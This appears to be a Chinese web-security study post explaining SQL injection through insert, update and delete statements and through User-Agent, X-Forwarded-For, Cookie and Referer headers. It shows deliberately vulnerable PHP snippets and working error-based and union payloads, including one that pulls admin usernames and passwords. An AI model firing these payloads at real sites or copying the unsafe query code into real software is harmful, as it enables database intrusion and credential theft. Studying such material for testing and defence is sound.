---
title: SQL注入&增删改查&HTTP头&UA&XFF&Referer&Cookie&无回显报错&复盘
published: 2026-04-19 16:00:00
description: 从增删改查到HTTP头注入，涵盖UA、XFF、Cookie、Referer等常见注入点，结合代码分析与实战案例，理清不同SQL操作场景下的注入手法差异。
tags: [Web攻防,SQL注入]
category: 网络安全
draft: false
---

# 知识点

1. Web攻防-SQL注入-操作方法&增删改查
2. Web攻防-SQL注入-HTTP头&UA&Cookie
3. Web攻防-SQL注入-HTTP头&XFF&Referer

案例说明：

在应用中，存在增删改查数据的操作，其中SQL语句结构不一导致注入语句也要针对应用达到兼容执行，另外也需要明白黑盒中功能对应的操作方法；除此之外部分业务应用功能也要做到了解（如接受IP,UA,COOKIE,Referer等头部），并且通过功能分析出对应SQL操作方法。

# 增删改查

参考文章：https://www.cnblogs.com/xiangbing123/p/12913891.html

增删改查大致功能应用：

## select查询：用户查询，新闻查询

![image-20260419161612489](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260419161612489.png)

## delete删除：用户删除，新闻删除

![image-20260419161711261](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260419161711261.png)

![image-20260419163606262](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260419163606262.png)

payload：

数字型

```
1 or updatexml(1,concat(0x7e,(database())),1)
```

## update修改：用户修改，新闻修改

![image-20260419162858945](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260419162858945.png)

payload：

```
// updatexml
1' or updatexml(1,concat(0x7e,(database())),1) or '
换成and也可以，但是尽量用or
// extractvalue
1' or extractvalue(1,concat(0x7e,(database()))) or'
```

## insert增加：用户注册，新闻添加

![image-20260419163340524](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260419163340524.png)

同样也是报错注入。

为什么`select`查询的注入语句没法用在删除、修改、增加这种上面，**原因就是一般`select`查询都会对查询的数据做显示，**

而删除、修改、增加这种只会告诉你一个执行结果。

# UA(User-Agent)

## 场景1：对UA设备指定显示方案

关键代码部分：

```php
// 获取 User - Agent 并进行转义
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// 构建 SQL 查询语句
$sql = "SELECT * FROM user_visits WHERE user_agent = '$user_agent'";
```

注入的时候优先考虑闭合问题，且因为这里是UA头，首先要考虑到字符串，所以sql语句应该使用单引号或双引号进行闭合。

抓包后修改请求头：

```
// 发现正常
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' order by 4#
// 报错
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' order by 5#

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' union select 1,2,database(),4#
// 实战中需要考虑到联合查询被过滤或开发者写的 SQL 结构不同时（比如不是 SELECT、括号位置不同等），需要换成其他sql语句
```

## 场景2：对UA设备进行信息记录

```php
// 获取 User - Agent 并进行转义
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// 构建 SQL 插入语句（假设）
$sql = "INSERT INTO user_visits (user_agent) VALUES ('$user_agent')";
```

如果这里换为insert，那么场景1中的union select就不起作用了。

# XFF(X-Forwarded-For)

## 场景1：限制IP访问功能

关键代码部分：

```php
// 获取 X-Forwarded-For 头信息
$xff = $_SERVER['HTTP_X_FORWARDED_FOR']?? null;

// 如果 X-Forwarded-For 头存在，取第一个 IP 地址
if ($xff) {
    $client_ip = $xff;
} else {
    // 如果 X-Forwarded-For 头不存在，使用客户端的 IP 地址
    // 如果是这个方法（还有其他方法）验证正常获取ip，那数据包无法进行伪造
    $client_ip = $_SERVER['REMOTE_ADDR'];
}

// 构建存在 SQL 注入风险的查询语句
$sql = "SELECT * FROM allowed_ips WHERE ip_address = '$client_ip'";
//echo $client_ip;
//echo $sql;

// 执行查询
$result = $conn->query($sql);

if ($result->num_rows > 0) {

    $row = $result->fetch_assoc();
    echo $row['ip_address']."<br>";
    include('xff.html');
} else {
    header('HTTP/1.1 403 Forbidden');
    echo "你没有权限访问该页面。";
}
```

一般都是有白名单存放在数据库中。

这时需要抓包增加 X-Forwarded-For 头（前提是代码需要以XFF头来获取并验证）：

```
X-Forwarded-For: x.x.x.x' order by 2#
X-Forwarded-For: x.x.x.x' union select 1,database()#
```

## 场景2：记录IP访问日志

 sql语句从查询换为插入数据

# Cookie

## 场景1

开发人员在编写一个根据用户 ID（存储在Cookie中）来查询信息的功能

如何确定cookie存储的用户id字段是什么？或者说如何确定抓包修改 Cookie 中某个字段以及字段的值？

可以注册小号进行抓包查看，或者fuzz字典（看运气）或者findsomething从js中提取的等。

关键代码部分：

```php
// 从 Cookie 中获取用户 ID
if (isset($_COOKIE['user_id'])) {	//	Cookie 字段名
    $user_id = $_COOKIE['user_id'];	//	PHP 变量名
} else {
    die("未发现存在用户访问。");
}

// 构建存在 SQL 注入风险的查询语句
$sql = "SELECT * FROM users WHERE id = $user_id";

// 执行查询
$result = $conn->query($sql);

if ($result && $result->num_rows > 0) {
    $row = $result->fetch_assoc();
    echo "用户名: ". $row['username']. "<br>";
    echo "邮箱: ". $row['email'];
} else {
    echo "未找到用户信息。";
}
```

抓包修改请求头：

```
// 写入
Cookie: user_id=1 and 1=2 union select 1,2,3 // 确定回显位置
// 因为是数字型所以不需要闭合
Cookie: user_id=1 union select 1,username,password from admin
```

# Referer

网站期望登录请求来自于本站页面，如果Referer是其他来源，则拒绝登录。

 关键代码部分：

```php
// 获取 Referer 头信息
$referer = $_SERVER['HTTP_REFERER']?? '';

// 构建存在 SQL 注入风险的查询语句，检查 Referer 是否允许
// 核心就是这部分
$referer_sql = "SELECT * FROM allowed_referers WHERE referer_url = '$referer'";
$referer_result = $conn->query($referer_sql);

if ($referer_result->num_rows === 0) {
    die("登录请求来源不合法，拒绝登录。");
}else{
    $row = $referer_result->fetch_assoc();
    echo "来源 ". $row['referer_url']. "<br>";
}

// 获取用户输入的用户名和密码
$input_username = $_POST['username'];
$input_password = $_POST['password'];

// 构建存在 SQL 注入风险的查询语句，验证用户登录
$login_sql = "SELECT * FROM users WHERE username = '$input_username' AND password = '$input_password'";
$login_result = $conn->query($login_sql);

if ($login_result->num_rows > 0) {
    echo "登录成功！欢迎，" . $input_username;
    $row = $login_result->fetch_assoc();
    echo $row['username']. "<br>";
} else {
    echo "用户名或密码错误。";
}
```

其实也就是：先验证登录请求来源，如果和数据库中存放允许登录的来源一致，那么才会进入正常的登录验证流程。

实战中需要看有没有关联，如果只检测来源，与数据库没有任何交互（检测是写死的），那么就不适用sql注入，只能尝试绕过。

抓包修改请求头：

```
Referer: xxxxx' order by 2#
Referer: xxxxx' union select .....
```

# 实例应用

## 增删改查-操作方法注入

SRC报告-广东工业大学sql注入

## HTTP头-cookie注入

SRC报告-吉林工业职业技术大学sql注入Bypass

## HTTP头-XFF注入

https://mp.weixin.qq.com/s/CiCxpHbW4IArB2nYSH-12w

https://mp.weixin.qq.com/s/_jj0o7BKm8CGEcn77gvdOg

## 加密还原+JSON注入

https://mp.weixin.qq.com/s/c3wji_LL_nuiskAKpg89pA

## HTTP头-403绕过

https://mp.weixin.qq.com/s/t0VH_9qmb1EuwPGiz3Bbcw